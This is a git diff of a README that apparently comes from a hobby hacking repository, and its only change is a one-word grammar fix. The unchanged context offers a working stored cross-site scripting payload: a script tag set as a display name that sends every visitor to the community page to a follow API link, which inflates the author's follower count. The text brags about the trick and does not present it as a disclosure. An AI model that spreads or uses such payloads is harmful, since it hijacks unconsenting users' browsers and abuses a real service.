@@ -14,7 +14,7 @@ I don't know if this is a feature or bug but you can manipulate the **Donate** b
     /api/follow.php?follow_user_id=98467&follow=1
 ```
 
-Get follows 100/hour Set your fun name to the code below. This bug will redirect **EVERYONE** visiting the community page to a follow link which will give you a follow(really dangerous). If you are now trapped in that loop just install the **[Redirect Blocker](https://chrome.google.com/webstore/detail/redirect-blocker/kjkidapfdhbcllgoaoobklapepffmcca/related?hl=en)** Extension and change your username. Thats why they call my hacker 😎😎.
+Get follows 100/hour Set your fun name to the code below. This bug will redirect **EVERYONE** visiting the community page to a follow link which will give you a follow(really dangerous). If you are now trapped in that loop just install the **[Redirect Blocker](https://chrome.google.com/webstore/detail/redirect-blocker/kjkidapfdhbcllgoaoobklapepffmcca/related?hl=en)** Extension and change your username. Thats why they call me hacker 😎😎.
 
 ```html
     <script>window.location.href = `/api/follow.php?follow_user_id=98467&follow=1`</script>
